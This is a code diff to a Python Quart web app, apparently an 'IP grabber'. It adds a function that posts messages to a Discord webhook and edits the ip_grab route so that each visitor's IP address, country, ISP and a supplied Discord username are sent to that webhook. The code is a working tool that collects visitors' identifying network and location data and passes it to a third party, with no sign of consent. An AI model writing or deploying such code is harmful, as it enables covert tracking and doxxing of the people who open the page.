@@ -12,7 +12,7 @@ Dependencies:
 import requests
 from logger import Logger
 from json_handler import *
-from quart import Quart, redirect, render_template, request
+from quart import Quart, jsonify, redirect, render_template, request
 
 app = Quart(__name__)
 l = Logger(console_log= True, file_logging=True, file_URI='logs/log.txt', override=True)
@@ -24,7 +24,38 @@ config:dict
 
 
 def send_to_channel(message:str):
-    pass
+    """
+    Sends a message using Discord webhook.
+
+    Args:
+    - message (str): The message to send.
+    - webhook_url (str): The URL of the Discord webhook.
+
+    Returns:
+    - bool: True if the message was sent successfully, False otherwise.
+    """
+    global config
+    
+    # Create payload
+    payload = {
+        "content": message
+    }
+
+    try:
+        # Send POST request to the webhook URL
+        response = requests.post(config["dc_webhook_url"], json=payload)
+        response.raise_for_status()  # Raise an exception for any HTTP error status
+
+        # Check if the message was sent successfully
+        if response.status_code == 204:
+            print("Message sent successfully")
+            return True
+        else:
+            print(f"Failed to send message. Status code: {response.status_code}")
+            return False
+    except requests.exceptions.RequestException as e:
+        print(f"Failed to send message: {e}")
+        return False
 
 
 async def get_country(ip_address):
@@ -101,15 +132,15 @@ async def ip_grab(dc_handle):
         country_name = data['country_name']
         country_code2 = data['country_code2']
         isp = data['isp']
-        dc_handle += '?'
         l.info(f'data is: {data}')
-        await send_to_channel(f'''
+        send_to_channel(f'''
 IP Grabber called:
 Username provided: {dc_handle}
 IP: {ip_address}
 Country: {country_name}/{country_code2}
 More infos: https://iplocation.com/?ip={ip_address}
 ''')
+        dc_handle += '?'
         return await render_template('result.html',dc_handle = dc_handle, ip=ip, ip_number=ip_number, ip_version=ip_version,
                                 country_name=country_name, country_code2=country_code2, isp=isp)
     except Exception as e:
